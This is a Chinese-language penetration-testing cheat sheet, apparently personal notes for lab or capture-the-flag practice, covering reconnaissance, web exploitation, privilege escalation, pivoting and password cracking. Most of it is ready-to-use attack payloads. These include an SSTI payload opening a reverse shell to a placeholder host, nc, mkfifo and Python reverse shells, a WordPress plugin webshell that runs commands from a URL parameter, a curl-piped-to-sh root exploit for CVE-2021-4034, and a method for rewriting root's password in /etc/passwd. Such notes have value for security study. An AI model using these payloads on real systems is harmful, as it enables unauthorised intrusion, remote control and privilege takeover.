# 方法论总结



## 信息搜集

### 主机发现

快速Arp发现:`sudo arp-scan -l [-I <interface>`

---

快速Arp发现:`sudo netdiscover -r <CIDR>`	

---

ICMP-Ping请求:`for i in $(seq 1 255); do ping -c 1 <IP.$i>; done`	

---

`for i in $(seq 1 255); do arping -c 2 <IP.$i>; done`

---

`sudo fping -gaq <CIDR>`

----

### 端口探测

全端口SYN扫描:`sudo nmap -sS -p- [--min-rate=2000]<ip>`

多目标不准确扫描:`sudo masscan -p- <CIDR> --rate=500`

---

端口服务&漏洞扫描:`sudo nmap -p<port> -sC -sV <ip>`

---

### DNS扫描

对于无法用ip访问的主机,尝试设置域名后再次访问

修改`/etc/hosts`文件

----

DNS服务端口:	tcp/udp 53

tcp 53:用于两台dns服务器之间进行数据传输、同步等操作

udp 53:用于向用户提供域名解析服务

----

AXFR区域传输:

`dig axfr @<dns_server> <domain-2.root-domain>`

## Web

### FUZZ

fuff非常强大,有必要深入研究!

可以通过设置过滤器,枚举我们需要的信息

`fuff -w <dict> -u <url?parameter=FUZZ>`

`ffuf -w <dict>:PARAM -w <dict>:VUL -u <url?PARAM=VUL> -fs 0` 

---

### 目录爆破

[dirsearch](https://github.com/maurosoria/dirsearch):	`dirsearch -u <url>`

feroxbuster: `sudo feroxbuster --url <url> -w <dict>`

`gobuster dir -u <url> -w <url> [-x <extensions>]`

----

#### 403 bypass:

REF: WEEK-8

1.**旁站绕过:**	

​	`Host: www.example.com`改为 `Host: xxx.example.com`

2.**来源欺骗:**	

​	`Referer: 127.0.0.1`

​	`Referer: http://example.com/auth/login`

​	`X-Forwarded-For: 127.0.0.1`

​	`X-Orginating-IP: 127.0.0.1`

​	`X-Remote-IP: 127.0.0.1`	

3.**URL覆盖**

原:`GET /auth/login HTTP/1.1`

现:访问不受限制的根路径`GET / HTTP/1.1`,但实际URL被重写覆盖了

​    `X-Original-URL: /auth/login`

​	`X-Rewrite-URL: /auth/login`

---

### 文件上传漏洞

1.绕过前端后缀名检测:	使用burp抓包并替换用户名

2.绕过后端后缀名检测:	IIS/Apache解析漏洞/%00截断

3.绕过文件MIME类型检测:	修改数据包并添加`Content-Type: image/png`

4.绕过文件头检测:	`GIF89a;`

---

### SQLI	sql注入漏洞

测试特殊字符:	`WEEK-2/magic_character.txt`

sqlmap:	`sqlmap --batch --random-agent -u <url>`

---

### 命令注入

使用`|`、`||`、`&&`等方式运行多个命令

---

### LFI 本地文件读取

参数传入文件名

绝对路径:`/etc/passwd`

相对路径:`../../../../../etc/passwd`

---

利用php封装器读取php文件源码

`php://filter/convert.base64-encode/resource=index.php`

利用php封装器写入文件

`php://filter/write=convert.base64-decode/resource=test.php&txt=<encoded_value>`

---

### ShellShock	破壳漏洞

1.寻找`/cgi-bin`下的文件`gobuster -u <url> -w /usr/share/seclists/Discovery/Web-Content/common.txt -x cgi,sh`

2.使用nmap脚本验证 `nmap --script http-shellshock --script-args uri=/cgi-bin/<file.cgi>,cmd=ls`

3.利用:`curl -H "User-Agent: () { :;}; echo; /bin/bash -c 'which nc'"`



---

### XXE xml外部实体注入

一般来说可以实现LFI,特殊情况可以实现RCE

```xml-dtd
<!DOCTYPE test[
	<!ENTITY file SYSTEM
"file:///etc/passwd">
]>
<a>&file;</a>
```

-----

### SSTI

其原理与SQLI类似,都是因为没有对用户输入进行过滤,导致任意内容被解析执行,可造成RCE.

测试payload:`{{1+abcxyz}}${1+abcxyz}<%1+abcxyz%>[abcxyz]`

反弹shell:`{% import os %}{{os.system('bash -c "bash -i >& /dev/tcp/<RHOST>/<RPORT> 0>&1"')}}`

----

### CMS

查找cms:`whatweb <url>`

#### Wordpress

REF:	WEEK-4

上传插件:

```php
<?php
/*
Plugin Name: Webshell
Plugin URI: https://github.com/busizhiya/
Description: Wordpress Webshell for Pentest
Version: 1.0
Author: bszy
Author URI: https://github.com/busizhiya/
License: https://github.com/busizhiya/
*/
if(isset($_GET['qaq']))
	{
  	system($_GET['qaq']);
	}
?>
```

访问:`http://example.com/wordpress/wp-content/plugins/wp-plugin-shell.php?qaq=id`

---

## 提权

### 升级Full TTY Shell

WEEK-4

Kali切换为bash:	`sudo chsh -s /bin/bash`

```sh
1.	Ctrl+Z
2.	stty raw -echo
3.	fg
4.	export SHELL=/bin/bash
5.	export TERM=screen
6.	stty rows 38 columns 126
7.	reset
```

---

### 升级python-pty shell

`python3 -c "import pty;pty.spawn('/bin/bash')"`

---

### GTFOBins 🚩

强烈推荐!!!

[GTFOBins](https://GTFOBins.github.io)

---

### suid提权

`find / -perm 4000 [-user root] 2>/dev/null`

---

### 内核漏洞

`uname -a`

----

2.6.22 < 3.9	[脏牛](https://github.com/FireFart/dirtycow)

---

较新版本:	18.04.1 ≤ Ubuntu < 20.04	[CVE-2021-3493.c](https://github.com/briskets/CVE-2021-3493)

----

[CVE-2021-4034](( curl -s https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.sh ; cat - ) | sh)

一键root:	`( curl -s https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.sh ; cat - ) | sh`

----

### sudo配置

`sudo -l`

#### sudo Baron Samedit

sudo漏洞	sudo <1.9.5p1

[CVE-2021-3156](https://github.com/worawit/CVE-2021-3156#cve-2021-3156-sudo-baron-samedit) (Sudo Baron Samedit)

---

### Capabilities

与sudo原理类似,但权限控制更细致

寻找具有特殊cap的文件:`/sbin/getcap / -r`

注意:大部分linux机器没有此指令

### Writable Files

`find / -writable 2>/dev/null | grep -v /proc | grep -v /run | grep -v /sys`

#### `/etc/passwd`可写:

`openssl passwd -1`生成`Salted md5`

将root用户的第二栏(密码)修改为此加盐密码

---

### 检查docker

`ls /.dockerenv`

`cat /proc/1/cgroup`

---

### 内网转发

---

**[Venom](https://github.com/Dliv3/Venom)**:

​	1.Kali启动Venom管理端:	`./admin_linux_x64 -lport <LPORT>`

​	2.Victim回连:	`./agent_linux_x64 -rhost <RHOST> -rport <RPORT>`

​	3.Kali启动本地socks代理:`show; goto <n>; socks <port>`

​	4.kali修改代理配置文件:	`sudo vi /etc/proxychains4.conf`;添加`socks5 127.0.0.1 <socks_port>`

​	5.`proxychains <command>`进行内网转发的命令

注:socks5协议只支持tcp与udp,并不支持arp与ICMP协议

---

### 技巧

下载文件时到/tmp目录下

查看/etc/passwd,获取用户列表

CMS下的配置文件,读取数据库/配置信息中的用户凭据并重用

----

## 获取shell

### nc

reverse_shell:(绕过防火墙)

​	Kali:`nc -nvlp <LPORT>`

​	Victim:`nc <RHOST> <RPORT> [-e /bin/bash]`

---

bind_shell:

​	Victim:`nc -nvlp <LPORT> [-e /bin/bash]`

​	Kali:`nc <RHOST> <RPORT>`

---

**串联nc**:

Victim:	`nc <RHOST> <RPORT-1> | /bin/bash 2>&1 | nc <RHOST> <RPORT-2>`

---

**管道文件**:

`rm /tmp/qaq;mkfifo /tmp/qaq;cat /tmp/qaq | /bin/bash -i 2>&1 | nc <RHOST> <RPORT> > /tmp/qaq`

---

### python

```python
import socket,os,subprocess
RHOST='10.0.0.12'  # Change it
RPORT=4444  # Change it
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  # 创建一个TCP-socket对象
s.connect((RHOST,RPORT)) 	# 连接攻击者
os.dup2(s.fileno(),0)		# 复制链接符
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])  # 创建子进程调用SHELL
```

-----

### ssh

查看目标主机登陆要求:`ssh <ip> -v`

通过LFI等方式读取`~/.ssh/id_rsa`文件,如果目标允许只用密钥登陆,则可GetShell.注意:调整密钥权限

将自身的`id_rsa.pub`追加到`~/.ssh/authorized_keys`中即可登录

----

## 文件传输

本地python监听:`python3 -m http.server [port]`

远程wget下载:`wget <url> -O <output_file>`

nc传输: Victim: `nc <RHOST> <RPORT> [</>] <file> [-q 1]`

## 漏洞利用

### 获取exploit

#### exploit-db

https://www.exploit-db.com/)

`searchsploit <EXP_Name>`

本地路径:`/usr/share/exploitdb/exploits`

----

## 密码破解

[在线破解-crackstation](https://crackstation.net/)

---

### 密码字典

Kali自带:	rockyou.txt

Seclists文件

---

#### 生成密码字典

##### crunch

`crunch <min> <max> <magic_characters> -o.dic`

递归生成每一个字符的序列

注:可设置密码格式,略

---

### hashcat

破解md5: `hashcat -m 0 -a 3 <md5> <pattern> --force`

pattern:	`?d`数字;`?l`小写字母

---

### john

#### 破解id_rsa-passphrase

`/usr/share/john/ssh2john id_rsa > hash`

`john --wordlist=<dict> hash`

---

#### 破解zip压缩包

`/usr/share/john/zip2john file.zip > hash`

`john --wordlist=<dict> hash`

## 编码破解

### CyberChef

​	Magic模块、Entropy

​	常用编码:	base系列

## 隐写术

查看是否存在隐写文件:`steghide info <file>` ;`binwalk -B <file>`

超快速破解密码:`stegseek --crack <file> <wordlist>`

二进制强制提取:`binwalk -e <file>`

----

## 逆向

### gdb-peda

加载文件:	`file <file>`

查看函数: 	`disas <func>`

运行:	`run`

模糊测试:

​	通过msf生成大量字符串,造成溢出,寻找偏移量.

```sh
msf-pattern_create -l 2000
msf-pattern_offset -l 2000 -q <pattern>
```

**建议使用IDA进行逆向~**